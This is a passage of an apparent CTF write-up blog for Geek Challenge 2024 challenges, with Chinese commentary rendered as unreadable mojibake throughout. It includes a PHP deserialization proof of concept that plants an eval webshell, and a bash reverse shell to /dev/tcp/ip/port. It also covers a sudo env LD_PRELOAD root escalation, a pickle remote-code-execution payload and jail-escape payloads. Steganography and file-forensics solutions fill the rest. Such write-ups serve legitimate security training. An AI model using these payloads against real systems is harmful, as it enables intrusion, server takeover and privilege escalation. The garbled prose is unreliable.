æœ‰ç‚¹å®åŠ›ï¼Œé‚£æ¥ä¸‹æ¥è¯¥æ€ä¹ˆæ‹¿åˆ°flagå‘¢ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿˜æƒ³ç›´æ¥è¯»flagï¼Œæ´—æ´—ç¡å§ï¼Œrceå»&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å±…ç„¶æ²¡å æœº&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä½ ä¹Ÿæƒ³è¢«è‚˜å—&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯•è¯•æ‰€æƒ³çš„å‘—ï¼Œè¯´ä¸å®šæˆåŠŸäº†&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Syclover&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Syclover</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Syclover</span>));</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;æ€ä¹ˆä¸ç»™æˆ‘å‘¢ï¼Œæ˜¯ä¸å–œæ¬¢å—ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æå‘ç°:</p><ul><li>åºåˆ—åŒ–å­—ç¬¦ä¸²ä½¿ç”¨base64åŠ å¯†</li><li>æ¼æ´ç‚¹åœ¨<code>lhRaMK7</code>çš„<code>__invoke()</code></li><li><code>is_readable(&quot;/flag&quot;)</code>ç›®æµ‹ä¸å¯è¯»ï¼Œæ‰€ä»¥åç»­éœ€è¦ææƒ</li></ul><p>å€’æ¨å¯å¾—POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend-&gt;love = <span class="string">&quot;file_put_contents(&#x27;a.php&#x27;,&#x27;&lt;?php highlight_file(__FILE__);@eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>phpinfo()</code>å‘ç°phpç‰ˆæœ¬ä¸º7.2<br>ç›´æ¥ä½¿ç”¨<code>system()</code>å‡½æ•°å‘ç°å±…ç„¶æœ‰disable_function<br>äºæ˜¯ä¸€ä¸ªä¸€ä¸ªè¯•å‘ç°<code>file_put_contents()</code>å¯ç”¨,ä¸”å½“å‰ç›®å½•å¯å†™<br>æ‰€ä»¥ç›´æ¥å†™é©¬ï¼Œä¸Šé©¬åä½¿ç”¨phpç‰ˆæœ¬æ¼æ´ç»•è¿‡disable_function,ç›´æ¥æ‰§è¡Œå‘½ä»¤<br>è¯¦è§<a href="https://www.youncyb.cn/?p=625#Bypass-disable_functions">æ–‡ç« </a><br>æ‰§è¡Œ<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</code>å›å¼¹shell<br>æ¥æ”¶åä½¿ç”¨<code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</code>å‡äº¤äº’å¼<br>ä¸€ç•ªæ£€æŸ¥:<br><img src="/2025/03/07/geek2024/shell.png"><br>sudoå¯ä»¥ä½¿ç”¨<br>çœ‹ä¸€çœ¼env,å‘ç°:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HINT=why_not_trytry_sudo</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>sudo -l</code>æœç´¢å¯ç”¨æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on</span><br><span class="line">        dep-0790f3fc-174e-4e43-a484-b6d3615adf07-59c798cd59-nb5c6:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/envUser www-data may run the following commands on</span><br><span class="line">        dep-0790f3fc-174e-4e43-a484-b6d3615adf07-59c798cd59-nb5c6:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/env</span><br></pre></td></tr></table></figure><p>envèƒ½ç”¨ï¼Œæˆ‘å¯»æ€envæœ‰å•¥ç”¨å•Šï¼Œä½†æ˜¯gptå‘Šè¯‰æˆ‘ç¡®å®æœ‰ç”¨:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o /tmp/preload.so preload.c</span><br><span class="line">sudo env LD_PRELOAD=/tmp/preload.so /bin/bash</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‹¿ä¸‹ä¸€ä¸ªrootç»ˆç«¯,ç®€ç›´crazy<br>ç›´æ¥<code>cat /flag</code><br>è·å¾—:<code>SYC&#123;f2e3cce2-5c9c-4876-b7c4-cbb140ebbfd0&#125;</code></p><h1 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h1><p>å¸¸è§„æ³¨å†Œç™»å½•ï¼Œæš‚æ—¶æ²¡æœ‰å‘ç°å¯æ”»å‡»çš„ç‚¹<br>ä½†ç™»å½•åæç¤ºæŸ¥çœ‹:<code>/starven_s3cret</code><br>æˆåŠŸè·å¾—æºç :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctferï¼šç»™ä½ æºç åªæ˜¯ç»™ä½ æ¼æ´ç‚¹çš„hintï¼Œæ€ä¹ˆç»•ï¼Ÿblack.pyé»‘ç›’ï¼Œå”‰æ— æ„ä¹‰</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>å¯è§æ˜¯ä¸€ä¸ªpickleæ³¨å…¥é¢˜ç›®<br>è€Œç™»å½•æ—¶å¯¹starvenå­¦é•¿è¯´çš„è¯å°±æ˜¯éœ€è¦æ³¨å…¥çš„å†…å®¹,éœ€è¦base64åŠ å¯†<br>é‚£ä¹ˆæ„é€ å¦‚ä¸‹poc:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(<span class="string">&quot;111&quot;</span>)))</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">111</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;xxx&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(<span class="string">&quot;gASVOQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCFlY2hvICIyMjIiPiBmaW5kIC1uYW1lIGpva2VyLmh0bWyUhZRSlC4=&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæœ¬æƒ³å¼¹shellï¼Œç»“æœå¼¹shellçš„å„ç§æ–¹æ³•è¢«è¿‡æ»¤ï¼Œ<br>å¦å¯»ä»–æ³•åå‘ç°index.htmlçš„æ–‡ä»¶ä½ç½®ç²¾ç¡®çš„æš´éœ²äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å°†æ‰§è¡Œå‘½ä»¤çš„å›æ˜¾å†™å…¥å³å¯:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;env &gt; templates/index.html&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure><p>å†å›åˆ°é¦–é¡µå³å¯æˆåŠŸè·å¾—flag</p><h1 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h1><p>wordæ–‡æ¡£çš„çœŸç›¸<br>ç‚¹è¿›wordæ–‡æ¡£,å‘ç°æœ‰é€æ˜å­—ç¬¦ï¼Œè°ƒæˆçº¢è‰²<br><img src="/2025/03/07/geek2024/word.png"><br>å‘ç°å¤–é¢å¤šäº†ä¸ªwelcome_TOæ–‡ä»¶<br>åŒæ—¶æ–‡ä»¶ä¸€ç›´æç¤ºè¦ä¿®å¤ï¼Œæ€€ç–‘æ–‡ä»¶ç»“æ„é‡Œå¡ä¸œè¥¿äº†<br>ç¿»æ‰¾å‘ç°<code>challenge\word\media</code>ä¸‹æœ‰flag03<br><img src="/2025/03/07/geek2024/flag03.png"><br>æœ€åæ‰“å¼€å®ä»£ç ï¼Œæ‰¾åˆ°äº†flag02<br><img src="/2025/03/07/geek2024/flag02.png"></p><h1 id="é›ª"><a href="#é›ª" class="headerlink" title="é›ª"></a>é›ª</h1><p>snowéšå†™<br>ä¸Šæ¥ä¸€ä¸ªå‹ç¼©åŒ…æ‰“ä¸å¼€<br>ç”¨è®°äº‹æœ¬åœ¨æœ«å°¾å‘ç°ä¸€ä¸²base64:<code>VzNMQzBNNA==</code><br>è§£å¯†å¾—:<code>W3LC0M4</code>ï¼Œä½œä¸ºå¯†ç è¾“å…¥æˆåŠŸè§£å‹<br>çœ‹åˆ°ä¸€ä¸ªwhite.txtæ–‡ä»¶,æ˜¾ç„¶æ˜¯nowéšå†™<br>æ²¡æœ‰å¯†ç ,ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªç›²æ°´å°å›¾ç‰‡<br>ä½¿ç”¨ç½‘ä¸Šæ‰¾æ¥çš„å·¥å…·è§£ç›²æ°´å°å¾—åˆ°å¯†ç :<code>Th1si4st8eK3y</code><br>æ‰§è¡Œ:<br><code>snow.exe -p Th1si4st8eK3y -C White.txt</code><br>æˆåŠŸè§£å¯†</p><h1 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h1><p>é¢˜ç›®:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">white_List=[<span class="string">&quot;+&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;,&quot;</span>]</span><br><span class="line">flag=os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">if</span> os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>)!=<span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;SYC&#123;test&#125;&quot;</span></span><br><span class="line">banner=<span class="string">&#x27;&#x27;&#x27;     _      ____                       __  __       _   _</span></span><br><span class="line"><span class="string">  __| | ___/ ___|  ___  _ __ ___   ___|  \/  | __ _| |_| |__</span></span><br><span class="line"><span class="string"> / _` |/ _ \___ \ / _ \| &#x27;_ ` _ \ / _ \ |\/| |/ _` | __| &#x27;_ \\</span></span><br><span class="line"><span class="string">| (_| | (_) |__) | (_) | | | | | |  __/ |  | | (_| | |_| | | |</span></span><br><span class="line"><span class="string"> \__,_|\___/____/ \___/|_| |_| |_|\___|_|  |_|\__,_|\__|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        exit(<span class="string">&quot;Please input ascii&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> white_List:</span><br><span class="line">            exit(<span class="string">&quot;hacker!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please do this math problem&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">input</span>(<span class="string">&quot;99*100^60= &quot;</span>)</span><br><span class="line">        waf(result)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">99</span> * <span class="number">100</span> ^ <span class="number">60</span> == <span class="built_in">eval</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congradulation!!!!! Here is your reward: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not right&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br></pre></td></tr></table></figure><p>è€ƒpythonåŸç”Ÿç±»é­”æœ¯æ–¹æ³•çš„ä½¿ç”¨<br>å‘ç°åªæœ‰geltå››ä¸ªè‹±æ–‡å­—ç¬¦å¯ä»¥ä½¿ç”¨,é‚£ä¹ˆå¾ˆå®¹æ˜“å°±å¯ä»¥å‘ç°:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__le__(())</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°1<br>é‚£ä¹ˆä¸¤ä¸ªåŠ èµ·æ¥å°±æ˜¯äºŒï¼Œå†åšå¹³æ–¹æ“ä½œå¾ˆå®¹æ˜“å°±å¯ä»¥è·å¾—ä»»ä½•æ•°ï¼Œæœ€ç»ˆpayload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(().__le__(()) + ().__le__(()))**13 + (().__le__(()) + ().__le__(()))**10+ (().__le__(()) + ().__le__(()))**9+ (().__le__(()) + ().__le__(()))**7+ (().__le__(()) + ().__le__(()))**4</span><br></pre></td></tr></table></figure><p>å¾—åˆ°9872,æäº¤å³å¯</p><h1 id="I-wanna-go-to-SYC"><a href="#I-wanna-go-to-SYC" class="headerlink" title="I_wanna_go_to_SYC"></a>I_wanna_go_to_SYC</h1><p>è¿›å…¥æ¸¸æˆï¼Œå‘ç°ç¬¬ä¸€ä¸ªåˆºéƒ½è·³ä¸è¿‡å»<br>ä½†æ˜¯ä¼šç”Ÿæˆå¾ˆå¤šå­˜æ¡£æ–‡ä»¶:<br><img src="/2025/03/07/geek2024/iwanna.png"><br>éšä¾¿å°†ä¸€ä¸ªå­˜æ¡£æ–‡ä»¶ä¿®æ”¹ä¸€ä¸‹ï¼Œä¿å­˜å†è¿›å…¥æ¸¸æˆ<br>å‘ç°æ¸¸æˆè¿›å…¥äº†ä¸€ä¸ªé”™è¯¯çš„åœ°å›¾ï¼ŒèƒŒæ™¯å°±æ˜¯flag<br>æ‰‹å¿«æˆªå›¾å³å¯</p><h1 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h1><p>libcimbarç¼–ç ï¼š<br><img src="/2025/03/07/geek2024/cimbar.png"><br><img src="/2025/03/07/geek2024/cimbar2.png"><br>å¯¹ç€å¯¹ç…§è¡¨ä¸€ä¸ªä¸€ä¸ªè§£å¯†,å‘ç°ç¬¬ä¸€è¡Œæ˜¯<code>SYC&#123;</code><br>é‚£ä¹ˆå°±æ˜¯flagæ— ç–‘äº†ï¼Œå°†æ•´å¼ å›¾ç‰‡éƒ½decode<br>å¾—åˆ°flag</p><h1 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h1><p>ä½¿ç”¨010editoræ‰“å¼€<br>å‘ç°æŠ¥å¼‚å¸¸<br>çŒœæµ‹æ˜¯å®½é«˜è¢«ä¿®æ”¹<br>å°†å®½é«˜éƒ½æ”¹æˆ640ï¼Œå¾—åˆ°æ­£ç¡®å›¾ç‰‡ï¼Œè·å¾—flag<br><img src="/2025/03/07/geek2024/starven.jpg"></p><h1 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h1><p>æµé‡åˆ†æé¢˜<br>ä½†æ˜¯ç›´æ¥ä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€<br>æœç´¢SYC<br>ç›´æ¥æ‰¾åˆ°flagï¼Œåœ¨æ˜æ–‡é‡Œ<br>å±äºéé¢„æœŸäº†</p><h1 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h1><p>pyjail</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please check the blacklist and input your code</span><br><span class="line">[&#x27;import&#x27;, &#x27;os&#x27;, &#x27;breakpoint&#x27;, &#x27;input&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;help&#x27;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;]</span><br><span 